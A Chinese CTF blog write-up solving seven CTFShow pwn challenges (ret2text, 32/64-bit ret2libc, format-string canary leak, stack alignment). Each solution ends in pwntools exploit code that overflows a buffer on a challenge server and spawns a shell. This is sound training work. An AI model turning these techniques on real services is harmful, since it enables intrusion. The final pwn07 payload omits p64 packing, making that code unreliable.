---
title: BUUCTF_0x1
categories: 
    - CTF刷题记录
    - BUUCTF
---


# Pwn_CTFShow
<!--more-->
## 1.PWN签到题
直接 `nc`
 
出flag，白给

## 2.pwn02
### ret2text 32
file 一下
![在这里插入图片描述](https://img-blog.csdnimg.cn/20201003165432499.png#pic_center)

32bit

IDA分析

![在这里插入图片描述](https://img-blog.csdnimg.cn/2020100316555337.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1lhbmdaaVRyaWNr,size_16,color_FFFFFF,t_70#pic_center)

发现 bin/sh 地址

可以用 `cyclic`生成字符串，然后gdb run一下，再计算出偏移

![在这里插入图片描述](https://img-blog.csdnimg.cn/20201003165929850.png#pic_center)

![在这里插入图片描述](https://img-blog.csdnimg.cn/202010031701141.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1lhbmdaaVRyaWNr,size_16,color_FFFFFF,t_70#pic_center)


![在这里插入图片描述](https://img-blog.csdnimg.cn/20201003170147811.png#pic_center)

![在这里插入图片描述](https://img-blog.csdnimg.cn/20201003170222624.png#pic_center)

`cyclic -l 0x......`

![在这里插入图片描述](https://img-blog.csdnimg.cn/20201003170357937.png#pic_center)

exp：

```python
from pwn import *

p=remote('111.231.70.44',28042)

payload='a'*13 + p32(0x8048518)

p.sendline(payload)

p.interactive()
```
## 3.pwn03
### libc 32
[参考博客](https://blog.csdn.net/gd_9988/article/details/106744216)

先`checksec`一下

![](https://img-blog.csdnimg.cn/20201005131216747.png#pic_center)

32bit 程序
IDA分析
先看main函数

![在这里插入图片描述](https://img-blog.csdnimg.cn/20201005131301855.png#pic_center)

没有什么线索，再进pwnme函数

![在这里插入图片描述](https://img-blog.csdnimg.cn/20201005131359321.png#pic_center)

![在这里插入图片描述](https://img-blog.csdnimg.cn/20201005131425904.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1lhbmdaaVRyaWNr,size_16,color_FFFFFF,t_70#pic_center)

发现存在一个栈溢出
由于找不到system函数的地址，所以

> 涉及到plt表和got表
程序执行后，plt表里是got表的地址，got表是函数的真实地址
程序还未执行时，got表里还是plt表的地址
我们需要泄漏got表里的地址，由于开启了ASLR，本地和远程的地址不一样
但也只是针对于地址中间位进行随机，最低的12位并不会发生改变
也就是我们需要获取到远程环境的函数的真实地址
进而判断libc的版本，计算泄漏的函数got表的地址与system的偏移，然后获取到system函数的真实地址，进而计算system函数与/bin/sh的偏移，最终getshell
所以我们首先exp的构造
首先栈溢出，利用puts函数的plt表的地址，泄漏puts函数的got表中的函数的真实地址,然后返回地址填写main函数重新跳转回来

exp：

```python
from pwn import *
#context.log_level = 'debug'

p = remote('111.231.70.44',28063)
#p = process('./stack1')

elf = ELF('./stack1')
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
main_addr = elf.symbols['main']

payload = "A"*13 + p32(puts_plt) + p32(main_addr) + p32(puts_got)

p.sendline(payload)

p.recvuntil('\n\n')

get_addr = u32(p.recv(4))

print(hex(get_addr))
```

输出了puts函数的真实地址
ps：这里要remote过去，否则输出的地址会不一样

![在这里插入图片描述](https://img-blog.csdnimg.cn/20201005133520774.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1lhbmdaaVRyaWNr,size_16,color_FFFFFF,t_70#pic_center)

可以通过后三位判断libc的版本
[libcSearch](https://libc.blukat.me/)

![在这里插入图片描述](https://img-blog.csdnimg.cn/20201005134105795.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1lhbmdaaVRyaWNr,size_16,color_FFFFFF,t_70#pic_center)
知道这些信息之后
exp：

```python
from pwn import *
#context.log_level = 'debug'

p = remote('111.231.70.44',28063)
#p = process('./stack1')

elf = ELF('./stack1')
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
main_addr = elf.symbols['main']

payload = "A"*13 + p32(puts_plt) + p32(main_addr) + p32(puts_got)

p.sendline(payload)

p.recvuntil('\n\n')

get_addr = u32(p.recv(4))

print(hex(get_addr))

libcbase = get_addr - 0x067360
system_addr = libcbase + 0x03cd10
bin_sh = libcbase + 0x17b8cf
payload = flat(['A'*13,system_addr,'AAAA',bin_sh])

p.sendline(payload)

p.interactive()
```

## 4.pwn04

### canary

先checksec

![在这里插入图片描述](https://img-blog.csdnimg.cn/2020100514433593.png#pic_center)

栈不可执行
Canary打开

> canary:
用于防止栈溢出被利用的一种方法，原理是在栈的ebp下面放一个随机数，在函数返回之前会检查这个数有没有被修改，就可以检测是否发生栈溢出。

main函数：

![在这里插入图片描述](https://img-blog.csdnimg.cn/20201005144542442.png#pic_center)

没有线索，跟进vuln函数

![在这里插入图片描述](https://img-blog.csdnimg.cn/20201005144639881.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1lhbmdaaVRyaWNr,size_16,color_FFFFFF,t_70#pic_center)

看到v3就是canary了
也就是下面的 [ebp-0ch]

![在这里插入图片描述](https://img-blog.csdnimg.cn/20201005145903257.png#pic_center)

在vuln函数中canary赋值给了eax
我们可以通过在这个赋值之后下一个断点，来获取canary的值
在此之前我们需要知道printf函数的地址，用来找到canary的偏移
所以要先在printf函数下面下一个断点
`b printf`

![在这里插入图片描述](https://img-blog.csdnimg.cn/20201005150508325.png#pic_center)

`run`

![在这里插入图片描述](https://img-blog.csdnimg.cn/20201005152146251.png#pic_center)

可以看到
printf函数的地址是 0xffffd0b0

然后在canary赋值之后下一个断点
ps：在vuln函数和main函数中都有canary的赋值

![在这里插入图片描述](https://img-blog.csdnimg.cn/20201005151100579.png#pic_center)

![在这里插入图片描述](https://img-blog.csdnimg.cn/20201005151126582.png#pic_center)

这里需要用main函数里面的（我也不知道为什么。。。
`b *0x080486C9`

![在这里插入图片描述](https://img-blog.csdnimg.cn/20201005152008443.png#pic_center)

这样就找到了canary的值
之后看printf的地址，找到canary的值，然后算出偏移
`x/40wx 0xffffd0b0`

![在这里插入图片描述](https://img-blog.csdnimg.cn/20201005151654295.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1lhbmdaaVRyaWNr,size_16,color_FFFFFF,t_70#pic_center)

发现0x0x1276e500的偏移为31，所以构造canary的值为%31$x
canary的值要靠我们的输入buf来赋值，所以要计算一下buf和v3的偏移 = (0x70-0xC) =100

![在这里插入图片描述](https://img-blog.csdnimg.cn/20201005153200798.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1lhbmdaaVRyaWNr,size_16,color_FFFFFF,t_70#pic_center)

最后还有 (0x8+4) = 12 个字节需要覆盖，覆盖返回地址到system函数才能取得shell

exp：

```python
from pwn import *

p =remote("111.231.70.44",28017)

p.recv()
leak_canary = "%31$x"
p.sendline(leak_canary)
canary = int(p.recv(),16)

print(hex(canary))

getshell = "a" * 100 + p32(canary) + "b" * 12 + p32(0x0804859B)

p.sendline(getshell)

p.interactive()
```

## 5.pwn05

### ret2text 32 

IDA分析一下

![在这里插入图片描述](https://img-blog.csdnimg.cn/20201005154604507.png#pic_center)

gets函数 明显的溢出
双击s

![在这里插入图片描述](https://img-blog.csdnimg.cn/20201005154653584.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1lhbmdaaVRyaWNr,size_16,color_FFFFFF,t_70#pic_center)

偏移为 (0x14+4)
再 Shift+F12

![在这里插入图片描述](https://img-blog.csdnimg.cn/20201005154801510.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1lhbmdaaVRyaWNr,size_16,color_FFFFFF,t_70#pic_center)

找到 /bin/sh 

![在这里插入图片描述](https://img-blog.csdnimg.cn/20201005154913771.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1lhbmdaaVRyaWNr,size_16,color_FFFFFF,t_70#pic_center)

exp：

```python
from pwn import *

p=remote('111.231.70.44',28024)

payload='a'*(0x14+4) + p32(0x08048486)

p.sendline(payload)

p.interactive()
```
## 6.pwn06

### 堆栈平衡 64 

64位的pwn05
所以和上一题是差不多的
不同的是这里要平衡堆栈

![在这里插入图片描述](https://img-blog.csdnimg.cn/20201005160148927.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1lhbmdaaVRyaWNr,size_16,color_FFFFFF,t_70#pic_center)

push rbp ：将bp寄存器的值压入栈中 
然后再看偏移

![在这里插入图片描述](https://img-blog.csdnimg.cn/20201005160422216.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1lhbmdaaVRyaWNr,size_16,color_FFFFFF,t_70#pic_center)

这里32位是4，而64位则是8

exp：

```python
from pwn import *

p=remote('111.231.70.44',28070)

payload='a'*(0xc+8) + p64(0x400577)+ p64(0x400577)

p.sendline(payload)

p.interactive()
```

## 7.pwn07

### libc 64

先checksec一下

![在这里插入图片描述](https://img-blog.csdnimg.cn/20201012192733970.png#pic_center)

这题和pwn03差的不多
pwn03是32bit的，这题是64bit的
64比32需要的payload多了一个pop rdi,ret

```python
32位：
payload："a"*offset + p32(plt) + p32(ret_addr) + p32(got)
getshell: "a"*offset + p32(system_addr) + "AAAA" + p32(str_bin_sh)
64位：
payload："a"*offset + p64(pop_rdi) + p64(got) + p64(plt) + p64(ret_addr)
getshell: "a"*offset + p64(ret) + p64(pop_rdi) + p64(str_bin_sh)
```
`ROPgadget --binary [file name]`

![在这里插入图片描述](https://img-blog.csdnimg.cn/20201012194105578.png#pic_center)

![在这里插入图片描述](https://img-blog.csdnimg.cn/20201012194138780.png#pic_center)



exp：

```python
from pwn import *

context.log_level = 'debug'

context.arch = 'amd64'

#p = process('./pwn')

p = remote('111.231.70.44',28049)

elf = ELF('./pwn')  #产生一个对象

puts_plt = elf.plt['puts']

puts_got = elf.got['puts']

pop_rdi = 0x4006e3 # ROPgadget --binary [file name]

main = elf.symbols['main']  #elf.symbols['a_function']  找到 a_function 的地址

payload = 'a'*20 + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main)
#64位payload: "a"*offset + p64(pop_rdi) + p64(got) + p64(plt) + p64(ret_addr/main)

p.sendline(payload)

p.recvuntil('\x0a') #p.recvuntil(some_string) 接收到 some_string 为止

puts_addr = u64(p.recv(6).ljust(8,b'\x00')) #p.recvn(N)   接受 N(数字) 字符

print(hex(puts_addr))

ret_addr = 0x4006E4

libcbase = puts_addr -  0x0809c0    # -libc_Offset的puts

system_addr = libcbase + 0x04f440   # +libc_Offset的system

bin_sh = libcbase + 0x1b3e9a        # +libc_Offset的bin/sh

payload = 'a'*20 + ret_addr + pop_rdi + bin_sh + system_addr
#getshell: b"a"*offset + p64(ret) + p64(pop_rdi) + p64(str_bin_sh)

p.sendline(payload)

p.interactive()


```






















